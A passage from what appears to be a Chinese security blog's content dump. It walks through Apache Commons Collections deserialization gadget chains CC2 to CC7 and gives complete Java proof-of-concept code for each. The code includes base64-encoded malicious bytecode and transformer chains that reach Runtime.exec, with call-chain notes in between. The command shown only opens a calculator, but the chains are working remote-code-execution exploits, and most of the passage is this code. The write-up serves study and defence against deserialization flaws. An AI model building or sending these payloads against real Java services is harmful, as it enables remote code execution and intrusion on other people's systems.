Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //反射设置 Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;Yasax1&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //Transformer数组 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //LazyMap实例 Map uselessMap = new HashMap(); Map lazyMap = LazyMap.decorate(uselessMap,chainedTransformer); //反射获取AnnotationInvocationHandler实例 Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap); //动态代理类，为了触发 AnnotationInvocationHandler#invoke Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler); InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Override.class, mapProxy); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(handler1); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } //反射设置 Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } 调用链AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() 这里的前半段和CC1是一样,因为这里用的实验环境是jdk1.7,如果这里前面调用LazyMap.get()的链子换成jdk1.8可用的,就能实现在1.8版本下运行。CC3就是为了绕过⼀些规则对InvokerTransformer的限制,去掉了 InvokerTransformer ,引入TemlatesImpl等新面孔,所以在我们的poc中,主要变化就是Transformer[]里的内容 流程图 TemlatesImplTransletClassLoader类继承了ClassLoader 并且重写了它的defineClass,由其父类的protected类型变成了一个default类型的方法,可以被其他类调用 其他的地方看看流程图应该就能看懂了。 一些其他点在创建TemplatesImpl对象时,我们使用了setFieldValue 方法用来设置私有属性。这里设置了_name和_bytecodes。_name这里不能为空,_bytecodes为我们传入的字节码。 ysoserial中还设置了_tfactory为TransformerFactoryImpl,因为TemplatesImpl#defineTransletClasses() 方法里有调用到_tfactory.getExternalExtensionsMap(),但是我并没有找到这个_tfactory.getExternalExtensionsMap(),而且我将_tfactory设置为null也能运行。在我将jdk版本更换为了1.8后找到了_tfactory.getExternalExtensionsMap(),这里_tfactory设置初始值应该是给后面版本准备的。 那么我们传入的字节码到底是什么呢,先看一下它的反编译代码 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class TemplatesImpl extends AbstractTranslet { @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } public TemplatesImpl() throws IOException { super(); Runtime runtime = Runtime.getRuntime(); runtime.exec(&quot;calc&quot;); } } 这里有个关键点,就是我们的恶意类需要继承于AbstractTranslet类。 但是我这里偏不信,我就不传继承于AbstractTranslet的类,想试试能不能正常执行。首先在defineTransletClasses中会对我们的恶意类进行判断 如果父类不是AbstractTranslet类的话则会进入else语句。而_auxClasses为Null,执行put方法则会报错。这里_auxClasses不能通过反射控制,因为它是Hashtable类型,Hashtable里面有transient类型成员。 但是上面有一个if语句可以对_auxClasses进行赋值,尝试修改一下poc,这里我修改了_bytecodes的长度,让其进入了if语句。 成功对_auxClasses进行了赋值,然后我们之前那段代码又会对_transletIndex进行判断,小于0则抛出异常。这里可以利用反射修改_transletIndex的值,把它修改成了1。当我以为我成功的时候,还是报错了。 defineTransletClasses方法我们顺利通过了,但是回到getTransletInstance方法的时候,又出现了一段这样的代码 AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 看来这里的逻辑就是需要我们传入的字节码中至少有一个类是继承与AbstractTranslet CC2Apache Commons Collections有以下两个分⽀版本： commons-collections:commons-collections org.apache.commons:commons-collections4 前者是老版本,后面的是新版本。cc2和cc4是新版本的,但新版本中老版本的POC依旧可用,只是可能类名方法名有些变化。 测试环境 jdk1.8 Commons Collections 4 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xerces.internal.impl.dv.util.Base64; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC21{ public static void main(String[] args) { try{ //字节码 byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //反射设置 Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //为了执行 templates.newTransformer InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]{}, new Object[]{}); //TransformingComparator 实例 TransformingComparator comparator = new TransformingComparator(invokerTransformer); //PriorityQueue 实例 PriorityQueue priorityQueue = new PriorityQueue(2); //先设置为正常变量值，后面可以通过setFieldValue修改 priorityQueue.add(1); priorityQueue.add(1); //反射设置 Field Object[] objects = new Object[]{templates, templates}; setFieldValue(priorityQueue, &quot;queue&quot;, objects); setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } catch (Exception e) { e.printStackTrace(); } } //反射设置 Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } 调用链PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform() TemplatesImpl.newTransformer() ………… 后面和CC3后面是一样的,主要是看前半段 PriorityQueue在java.util.PriorityQueue中的readObject方法中,调用了heapify()方法 这里的queue[i]的值是由readObject得到的，也就是说在writeObject处写入了对应的内容 所以在我们的poc中 PriorityQueue priorityQueue = new PriorityQueue(2); //这里放入两个值,这样才能进入heapify()方法中的siftDown方法 priorityQueue.add(1); //add传入的值则是我们的queue,先传入1,后面通过反射进行修改 priorityQueue.add(1); heapify方法调用siftDown方法 然后调用siftDownUsingComparator() 然后调用了comparator.compare(),comparator可控 TransformingComparator然后我们看到另一个类org.apache.commons.collections4.comparators.TransformingComparator,其中有一个compare方法 this.transformer可控。 关于PriorityQueue的原理:https://www.cnblogs.com/linghu-java/p/9467805.html 这里如果我们TransformingComparator.transformer传入的A对象 这里就相当于执行A.transform(obj);这里利用InvokerTransformer来调用templates.newTransformer(),然后后面就跟CC3的链子一样。 一些其他点如果我们直接priorityQueue.add(templates)会报错。那么这里为什么要先反射然后再修改queue的值呢。 这里因为我们在执行add方法的时候。会依次调用PriorityQueue#add()-&gt;PriorityQueue#offer()-&gt;PriorityQueue#siftUp(), 因为当时我们还没有给comparator赋值,所以会进入siftUpComparable方法 当执行到这一句的时候就会报错 如果我们在add前对comparator赋值那则可以正常运行 流程图 CC4测试环境 jdk1.7 Commons Collections 4 POCimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xerces.internal.impl.dv.util.Base64; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC4 { public static void main(String[] args) { try{ //字节码 byte[] code = Base64.decode(&quot;yv66vgAAADMALgoABgAgCgAhACIIACMKACEAJAcAJQcAJgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTFRlbXBsYXRlc0ltcGw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAB3J1bnRpbWUBABNMamF2YS9sYW5nL1J1bnRpbWU7BwAoAQAKU291cmNlRmlsZQEAElRlbXBsYXRlc0ltcGwuamF2YQwAGQAaBwApDAAqACsBAARjYWxjDAAsAC0BAA1UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAALAAsAAAAgAAMAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAEAARAAIAEgAAAAQAAQATAAEABwAUAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAAOAAsAAAAqAAQAAAABAAwADQAAAAAAAQAOAA8AAQAAAAEAFQAWAAIAAAABABcAGAADABIAAAAEAAEAEwABABkAGgACAAkAAABQAAIAAgAAABAqtwABuAACTCsSA7YABFexAAAAAgAKAAAAEgAEAAAAEQAEABIACAATAA8AFAALAAAAFgACAAAAEAAMAA0AAAAIAAgAGwAcAAEAEgAAAAQAAQAdAAEAHgAAAAIAHw==&quot;); //反射设置 Field TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{code}); setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(templates,&quot;_tfactory&quot;, new TransformerFactoryImpl()); //Transformer数组 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //TransformingComparator 实例 TransformingComparator comparator = new TransformingComparator(chainedTransformer); //PriorityQueue 实例 PriorityQueue priorityQueue = new PriorityQueue(2); //先设置为正常变量值，后面可以通过setFieldValue修改 priorityQueue.add(1); priorityQueue.add(1); //反射设置 Field Object[] objects = new Object[]{templates, templates}; setFieldValue(priorityQueue, &quot;queue&quot;, objects); setFieldValue(priorityQueue, &quot;comparator&quot;, comparator); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(priorityQueue); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } catch (Exception e) { e.printStackTrace(); } } //反射设置 Field public static void setFieldValue(Object object, String fieldName, Object value) { try { Field field = object.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(object, value); } catch (Exception e) { e.printStackTrace(); } } } 调用链ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() CC4 只是将 CC2 中的 InvokerTransformer 替换为了 InstantiateTransformer。 结束语这是自己随手画的图,而且巨丑,感兴趣的可以参考一下 因为自己跟CC链的时候发现链子之间都有一部分一样的,而且也是可以进行一些变换的,比如把CC3的入口换成其他链子的入口,即可实现JDK1.8版本的使用。所以感觉除了这7条链子,还应该有各种变种,来应对不同的情况.所以自己尝试画了这个图,只要能从上面走到最下面的路线,应该都是可以的(个人理解,没有任何依据,切勿直接当真,还需要证明)","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"Java复现","slug":"Java复现","permalink":"https://pp1ove.gitee.io/tags/Java复现/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"CC链学习-中","slug":"CC链学习-中","date":"2021-07-13T03:03:25.000Z","updated":"2021-07-19T13:01:00.606Z","comments":false,"path":"2021/07/13/CC链学习-中/","link":"","permalink":"https://pp1ove.gitee.io/2021/07/13/CC链学习-中/","excerpt":"","text":"CC5测试环境 jdk1.7 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class CC51 { public static Object generatePayload() throws Exception { ChainedTransformer Transformerchain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] { String.class }, new Object[]{&quot;calc&quot;})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,Transformerchain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(1); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(poc,tiedmap); return poc; } public static void main(String[] args) throws Exception { payload2File(generatePayload(),&quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //将构造好的payload序列化后写入文件中 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } 利用链 ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 通过利用链其实可以看出来,CC5的后半段利用链和CC1的lazymap那条链后面段是一样的,都是调用LazyMap的get方法触发命令,这里我们主要看前面是如何调用到LazyMap.get()的; TiedMapEntry 在toString方法中调用了getValue()方法,跟进去 调用了map.get方法,关于map在构造函数中赋值,map成员可控,接下来我们需要找哪里调用了toString方法 在cc5中使用了BadAttributeValueExpException这个类。 BadAttributeValueExpException 在该类的readObject方法中,调用了valObj.toString();那么这个valObj是从哪里来的呢 可以看到获取了val成员的值赋值给了valObj,这里我们让val=TiedMapEntry对象即可 流程图 CC6测试环境 jdk 1.7 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections4.keyvalue.TiedMapEntry; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CC61 { public static Object generatePayload() throws Exception { Transformer fakeTransformerransformer = new ChainedTransformer(new Transformer[]{}); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; Map map = new HashMap(); Map lazyMap = LazyMap.decorate(map, fakeTransformerransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;keykey&quot;); HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); lazyMap.remove(&quot;keykey&quot;); //如果不加这个就无法弹出计算器 //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令 Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); field.setAccessible(true); field.set(fakeTransformerransformer, transformers); return hashSet; } public static void main(String[] args) throws Exception { payload2File(generatePayload(), &quot;obj&quot;); payloadTest(&quot;obj&quot;); } public static void payload2File(Object instance, String file) throws Exception { //将构造好的payload序列化后写入文件中 ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file)); out.writeObject(instance); out.flush(); out.close(); } public static void payloadTest(String file) throws Exception { //读取写入的payload，并进行反序列化 ObjectInputStream in = new ObjectInputStream(new FileInputStream(file)); in.readObject(); in.close(); } } 利用链java.io.ObjectInputStream.readObject() HashSet.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 后面一段仍然是LazyMap.get(),主要还是看前半段 TiedMapEntry TiedMapEntry调用了getValue() getValue()方法调用了map成员的get方法,这里map成员可控,我们设置为lazymap对象 接下来就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash HashMap 而put方法调用了hash方法,并且我们可以可以将key作为hash方法的输入,接下来就还差一个入口了 HashSetysoserial选择的是HashSet#readObject() 在hashmap#readObject方法中调用了map对象的put方法,map对象是在上面几排赋的值,这里有个判断语句,这判断语句挺好控制的,这里我们需要让map=new HashMap(其实为LinkedHashMap也不影响,LinkedHashMap继承于HashMap,也没有重写put方法和hash方法),然后就是关于我们传入的e;参数e是用readObject取出来的，那么对应的我们就看看writeObject怎么写的: 我们需要控制传入map的keySet返回结果来控制变量。 流程图 P神版本在上面的流程的最后一步中,我们其实找到一个readObject方法能调用HashMap#put或者HashMap#hash就行了,而HashMap是自带readObject方法的, 跟进去 这里直接调用了hash方法,key也可控。 一些其他点这里为了避免本地调试时触发命令执⾏，构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformerransformer 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。(如果正常写应该也没啥问题) 但是如果去掉我们poc中的lazyMap.remove(&quot;keykey&quot;); Run的时候并不会弹出计算器,调试一下发现它并没有进入lazymap#get方法中的if语句,但是我们明明没有在lazyMap中加入”keykey”呀 这是应该是因为在调用hashSet#add时调用了hashMap的put方法, HashMap的put⽅法中，也有调⽤到 hash(key) 这⾥就导致 LazyMap 这个利⽤链在这⾥被调⽤了⼀遍，因为我前⾯⽤了fakeTransformers ,所以此 时并没有触发命令执⾏,但实际上也对我们构造Payload产⽣了影响。 解决⽅法也很简单，只需要将keykey这个Key,再从outerMap中移除即可： lazyMap.remove(“keykey”) CC7测试环境 jdk 1.8 Commons Collections 3.1 POCimport org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.AbstractMapDecorator; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.reflect.Field; import java.util.AbstractMap; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; public class CC71 { public static void main(String[] args) throws IllegalAccessException, IOException, ClassNotFoundException, NoSuchFieldException { Transformer[] fakeTransformerransformer = new Transformer[]{}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; //ChainedTransformer实例 //先设置假的 Transformer 数组，防止生成时执行命令 Transformer chainedTransformer = new ChainedTransformer(fakeTransformerransformer); //LazyMap实例 Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer); lazyMap1.put(&quot;yy&quot;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer); lazyMap2.put(&quot;zZ&quot;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, &quot;test&quot;); hashtable.put(lazyMap2, &quot;test&quot;); //通过反射设置真的 ransformer 数组 Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;); field.setAccessible(true); field.set(chainedTransformer, transformers); //上面的 hashtable.put 会使得 lazyMap2 增加一个 yy=&gt;yy，所以这里要移除 lazyMap2.remove(&quot;yy&quot;); //序列化 ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(hashtable); oos.flush(); oos.close(); //测试反序列化 ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } 利用链Hashtable.readObject() Hashtable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() ………… 后面还是LazyMap.get() AbstractMapequals方法中调用了m.get(key);这里m和key可控。但是因为AbstractMap是一个abstract类,在构造poc时只能找它的子类,而且没有重写该方法,在poc中选择的就是它的子类HashMap AbstractMapDecoratorMap可控。该类为lazpMap的父类 